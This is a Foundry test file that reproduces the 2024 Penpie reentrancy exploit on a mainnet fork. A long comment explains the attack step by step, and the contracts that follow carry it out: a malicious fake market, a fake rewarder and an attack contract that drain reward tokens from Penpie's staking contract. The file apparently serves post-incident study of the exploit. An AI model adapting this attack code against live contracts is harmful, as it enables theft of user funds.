// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

// Foundry
import {VmSafe} from "@forge-std/Vm.sol";
import {console} from "@forge-std/Console.sol";

// OpenZeppelin
import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";

// Local Interfaces
import {IMasterPenpie} from "src/interfaces/IMasterPenpie.sol";
import {IPendleStaking} from "src/interfaces/IPendleStaking.sol";
import {ActionAddRemoveLiqV3} from "src/interfaces/IPendlRouter.sol";
import {IPendleMarketDepositHelper} from "src/interfaces/IPendleMarketDepositHelper.sol";
import {IPendleGaugeControllerMainchainUpg} from "src/interfaces/IPendleGaugeControllerMainchainUpg.sol";

// Local Libraries

// Base for tests
import {Mainnet} from "src/utils/Addresses.sol";
import {Contracts} from "src/utils/Contracts.sol";
import {Base_Test_} from "src/Base.sol";

/**
 * KeyInfo - Total Lost :       16m$ (approx)
 * Protocol Attacked:           Penpie
 * Attack type:                 Reentrancy
 * Attacker:                    0xc0Eb7e6E2b94aA43BDD0c60E645fe915d5c6eb84
 * Attack Contract:             0x4af4c234b8cb6e060797e87afb724cfb1d320bb7
 * Vulnerable Contract:         0x6e799758cee75dae3d84e09d40dc416ecf713652 - Penpie: Pendle Staking Proxy
 * Attack tx:                   0x56e09abb35ff12271fdb38ff8a23e4d4a7396844426a94c4d3af2e8b7a0a2813 (One of the biggest attack, then replicated by others)
 * Attack block:                20671820
 * Blockchain:                  Ethereum and Arbitrum
 * Vulnerable Contract Code:    https://etherscan.deth.net/address/0xff51c6b493c1e4df4e491865352353eadff0f9f8
 *
 * Analysis
 * Post-mortem:
 * Twitter Guy:                 https://twitter.com/Penpiexyz_io/status/1831058385330118831
 * Hacking God:
 *
 * Explanation:
 * 0. Attacker flashloan wstETH, sUSDe, agETH and rswETH from Balancer for free.
 * 1. Attacker batchHarvestMarketRewards on Penpie Pendle Staking using a fake LPT Pendle token.
 *      - _harvestBatchMarketRewards call the fake LPT Pendle token to get bonus rewards tokens.
 *          - The fake LPT Pendle token is a malicious contract that return 4 different tokens as bonus rewards:
 *              - 0xc374f7ec85f8c7de3207a10bb1978ba104bda3b2 PT for stETH
 *              - 0xd1d7d99764f8a52aff007b7831cc02748b2013b5 PT for sUSDe
 *              - 0x6010676bc2534652ad1ef5fa8073dcf9ad7ebfbe PT for agETH
 *              - 0x038c1b03dab3b891afbca4371ec807edaa3e6eb6 PT for rswETH
 *              - 0x808507121b80c02388fad14726482e061b8da827 Pendle token.
 *      - _harvestBatchMarketRewards check balanceOf Penpie: Pendle Staking to get the amount of bonus rewards tokens before redeeming.
 *      - _harvestBatchMarketRewards call the fake LPT Pendle token to redeem rewards.
 *          - The fake LPT Pendle token will add liquidity and keep YT on Pendle using RouterV4 using funds from flashloans on market that are bonus rewards from above.
 *          - The atatcker check balanceOf Penpie: Pendle Staking to get the amount of bonus rewards tokens.
 *          - The attacker approve Penpie: Pendle Staking to spend the fake LPT Pendle token.
 *          - The attacker deposit market in Penpie: Pendle Staking the exact same amount of bonus rewards tokens that the Penpie: Pendle Staking has.
 *          - Redeem reward is now completed.
 *      - _harvestBatchMarketRewards check balanceOf Penpie: Pendle Staking to get the amount of bonus rewards tokens after redeeming.
 *          - But, thanks to the previous deposit, Penpie: Pendle Staking has twice the amount of bonus rewards tokens than before.
 *      - _harvestBatchMarketRewards send the diff between amount after and before redeeming to rewarder (which is malicious contract) with queueReward function.
 *          - This diff correspond to the amount of bonus rewards tokens that Penpie: Pendle Staking has at the beginning.
 *
 *      - _harvestBatchMarketRewards is now completed. Recap:
 *          - The attacker sent to himself the bonus rewards tokens that Penpie: Pendle Staking has at the beginning.
 *          - Now the attacker contract has the bonus rewards tokens that Penpie: Pendle Staking has at the beginning.
 *
 * 2. Attacker multiclaim on Penpie: MasterPenpie using the fake LPT Pendle token.
 *      - _multiclaim will mostly call the fake rewarder and transfer token to attacker contract.
 *
 * 3. Attacker withdrawMarket
 *      - The attacker withdrawMarket on all the bonus rewards tokens that Penpie: Pendle Staking has.
 *      - The attacker remove liquidity single token on the market corresponding to bonus rewards tokens and obtains wstETH, sUSDe, agETH and rswETH.
 *
 * 4. Attacker transfer back flashloaned tokens to Balancer.
 *
 *
 * Note:
 * Some shortcuts have been taken to simplify the attack.
 * - Instead of flashloan, we use a deal function to simulate it.
 * - We don't create a real market on Pendle, and approve it on Penpie. Instead we directly register the pool on Pendle impersonnating the Market Register contract.
 * - We use a fake rewarder contract to simulate it.
 * - The ttack invole 4 different tokens, but we only use one in this test.
 */
contract Hack_Penpie is Base_Test_ {
    //////////////////////////////////////////////////////
    /// --- CONSTANTS & IMMUTABLES
    //////////////////////////////////////////////////////
    uint256 public constant ATTACK_BLOCK_NUMBER = 20671820;

    address public immutable ATTACKER = 0xc0Eb7e6E2b94aA43BDD0c60E645fe915d5c6eb84;

    //////////////////////////////////////////////////////
    /// --- ATTACK CONTRACT
    //////////////////////////////////////////////////////
    IPendleStaking public pendleStaking;
    Fake_LPT_Pendle public fakeLPTPendle;
    Attack_Contract public attackContract;
    IPendleMarketDepositHelper public pendleMarketDepositHelper;

    address public rewarder;

    //////////////////////////////////////////////////////
    /// --- SETUP
    //////////////////////////////////////////////////////
    function setUp() public override {
        super.setUp();

        // Create a fork of the mainnet one block before the attack
        vm.createSelectFork("mainnet", ATTACK_BLOCK_NUMBER - 1);

        // Fetch contracts
        pendleStaking = IPendleStaking(payable(Mainnet.PENPIE_PENDLE_STAKING));
        pendleMarketDepositHelper = IPendleMarketDepositHelper(Mainnet.PENPIE_PENDLE_MARKET_DEPOSITOR_HELPER);

        // Deploy the attack contract
        fakeLPTPendle = new Fake_LPT_Pendle();
        attackContract = new Attack_Contract(fakeLPTPendle);
        fakeLPTPendle.setAttackContract(attackContract);

        // This is a cheat, to avoid creating a real market on Pendle, and approving it on Penpie.
        // This operation create a rewarder contract on Pendle, and we need to know its address.
        // We read logs for it.
        vm.recordLogs();
        vm.prank(Mainnet.PENDLE_MARKET_REGISTER_HELPER);
        pendleStaking.registerPool(address(fakeLPTPendle), 0, "Fake LPT Pendle", "fLPT");
        VmSafe.Log[] memory entries = vm.getRecordedLogs();
        for (uint256 i = 0; i < entries.length; i++) {
            if (
                keccak256(abi.encodePacked(bytes4(entries[i].topics[0])))
                    == keccak256(abi.encodeWithSignature("PoolAdded(address,address,address)"))
            ) (, rewarder,) = abi.decode(entries[i].data, (address, address, address));
            if (rewarder != address(0)) break;
        }
        require(rewarder != address(0), "Rewarder not found");

        // This is a cheat, to avoid creating a real market on Pendle, helping when calling the Gauge Controller.
        vm.mockCall(Mainnet.PENDLE_MARKET_FACTORY, abi.encodeWithSignature("isValidMarket(address)"), abi.encode(true));

        // Deploy fake rewarder at the same address of the real one.
        // In normal operation we will have deployed it before the attack.
        // But we are taking shortcuts here.
        Fake_Rewarder _fakeRewarder = new Fake_Rewarder();
        vm.etch(rewarder, address(_fakeRewarder).code);
        _fakeRewarder.setAttackContract(attackContract);

        // Labels
        vm.label(address(attackContract), "Attack_Contract");
        vm.label(address(fakeLPTPendle), "Fake_LPT_Pendle");
        vm.label(address(rewarder), "Rewarder");
        vm.label(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2, "PT for stETH");
        //vm.label(0xd1D7D99764f8a52Aff007b7831cc02748b2013b5, "PT for sUSDe");
        //vm.label(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, "PT for agETH");
        //vm.label(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, "PT for rswETH");
    }

    function test_Penpie_Attack_2024_09_03() public {
        assertEq(WSTETH.balanceOf(address(attackContract)), 0, "Balance of attack contract should be 0 at beginning");

        deal(address(WSTETH), address(attackContract), 16_000 ether); // Simulate Balancer Flashloan

        vm.startPrank(ATTACKER);
        attackContract.attack();
        vm.stopPrank();

        WSTETH.transferFrom(address(attackContract), address(0x1), 16_000 ether); // Transfer back flashloaned tokens to Balancer

        assertGt(
            WSTETH.balanceOf(address(attackContract)),
            2_500 ether,
            "Balance of attack contract should be greater than 2500 ether at end"
        );
    }
}

contract Attack_Contract is Contracts {
    IPendleStaking public pendleStaking = IPendleStaking(payable(Mainnet.PENPIE_PENDLE_STAKING));
    IPendleMarketDepositHelper public pendleMarketDepositHelper =
        IPendleMarketDepositHelper(Mainnet.PENPIE_PENDLE_MARKET_DEPOSITOR_HELPER);
    IMasterPenpie public masterPenpie = IMasterPenpie(Mainnet.PENPIE_MASTER);
    Fake_LPT_Pendle public fakeLPTPendle;

    constructor(Fake_LPT_Pendle _fakeLPTPendle) {
        fakeLPTPendle = _fakeLPTPendle;
        WSTETH.approve(msg.sender, type(uint256).max);
    }

    function attack() public {
        address[] memory market = new address[](1);
        market[0] = address(fakeLPTPendle);

        address[] memory rewardTokens = getRewardTokens();

        // 1. Harvest Market Rewards
        pendleStaking.batchHarvestMarketRewards(market, 0);

        uint256 balanceBefore = IERC20(rewardTokens[0]).balanceOf(address(this));
        // 2. Multiclaim
        masterPenpie.multiclaim(market);

        uint256 balanceAfter = IERC20(rewardTokens[0]).balanceOf(address(this));
        // 3. Withdraw Market
        pendleMarketDepositHelper.withdrawMarket(rewardTokens[0], balanceAfter - balanceBefore);
        IERC20(rewardTokens[0]).approve(address(PENDLE_ROUTER), IERC20(rewardTokens[0]).balanceOf(address(this)));
        PENDLE_ROUTER.removeLiquiditySingleToken(
            address(this),
            rewardTokens[0],
            IERC20(rewardTokens[0]).balanceOf(address(this)),
            ActionAddRemoveLiqV3.TokenOutput(
                address(WSTETH),
                0,
                address(WSTETH),
                address(0),
                ActionAddRemoveLiqV3.SwapData(getSwapType(0), address(0), "", false)
            ),
            ActionAddRemoveLiqV3.LimitOrderData(
                address(0),
                0,
                new ActionAddRemoveLiqV3.FillOrderParams[](0),
                new ActionAddRemoveLiqV3.FillOrderParams[](0),
                ""
            )
        );
    }

    function getRewardTokens() public pure returns (address[] memory) {
        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2; // PT for stETH
        //rewardTokens[1] = 0xd1D7D99764f8a52Aff007b7831cc02748b2013b5; // PT for sUSDe
        //rewardTokens[2] = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe; // PT for agETH
        //rewardTokens[3] = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6; // PT for rswETH

        return rewardTokens;
    }

    function claimRewards(address) external {
        address[] memory rewardTokens = getRewardTokens();
        WSTETH.approve(address(PENDLE_ROUTER), type(uint256).max);
        uint256 balance = WSTETH.balanceOf(address(this));

        // Add liquidity and keep YT on Pendle
        PENDLE_ROUTER.addLiquiditySingleTokenKeepYt(
            address(this),
            rewardTokens[0],
            1,
            1,
            ActionAddRemoveLiqV3.TokenInput(
                address(WSTETH),
                balance,
                address(WSTETH),
                address(0),
                ActionAddRemoveLiqV3.SwapData(getSwapType(0), address(0), "", false)
            )
        );

        // Checks balances
        uint256 balanceWSTETHStaking = IERC20(rewardTokens[0]).balanceOf(address(pendleStaking));
        IERC20(rewardTokens[0]).balanceOf(address(this));

        IERC20(rewardTokens[0]).approve(address(pendleStaking), balanceWSTETHStaking);

        pendleMarketDepositHelper.depositMarket(rewardTokens[0], balanceWSTETHStaking);
    }

    function getSwapType(uint8 _swapType) public pure returns (ActionAddRemoveLiqV3.SwapType swapType) {
        assembly ("memory-safe") {
            swapType := and(_swapType, 0xFF)
        }
    }
}

contract Fake_LPT_Pendle is Contracts {
    Attack_Contract public attackContract;

    IPendleGaugeControllerMainchainUpg public pendleGaugeControllerMainchainUpg =
        IPendleGaugeControllerMainchainUpg(Mainnet.PENDLE_GAUGE_CONTROLLER_MAINCHAIN_UPG);

    function setAttackContract(Attack_Contract _attackContract) public {
        attackContract = _attackContract;
    }

    function getRewardTokens() public view returns (address[] memory) {
        address[] memory rewardTokens = attackContract.getRewardTokens();

        address[] memory fakeRewardTokens = new address[](2);
        fakeRewardTokens[0] = rewardTokens[0];
        //fakeRewardTokens[1] = rewardTokens[1];
        //fakeRewardTokens[2] = rewardTokens[2];
        //fakeRewardTokens[3] = rewardTokens[3];
        fakeRewardTokens[1] = address(PENDLE);

        return fakeRewardTokens;
    }

    function redeemRewards(address) external returns (uint256[] memory empty) {
        // Claim rewards
        attackContract.claimRewards(address(this));

        //
        pendleGaugeControllerMainchainUpg.redeemMarketReward();
        address[] memory rewards = getRewardTokens();
        empty = new uint256[](rewards.length);
    }
}

contract Fake_Rewarder is Contracts {
    Attack_Contract public attackContract;

    event CustomRewardPaidTo();

    function setAttackContract(Attack_Contract _attackContract) public {
        attackContract = _attackContract;
    }

    function queueNewRewards(uint256 amount, address _rewardToken) external returns (bool) {
        IERC20(_rewardToken).transferFrom(msg.sender, address(this), amount);
        emit CustomRewardPaidTo();
        return true;
    }

    function getReward(address, address _receiver) external returns (bool) {
        address rewardToken = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2;
        IERC20(rewardToken).transfer(_receiver, IERC20(rewardToken).balanceOf(address(this)));
        return true;
    }
}
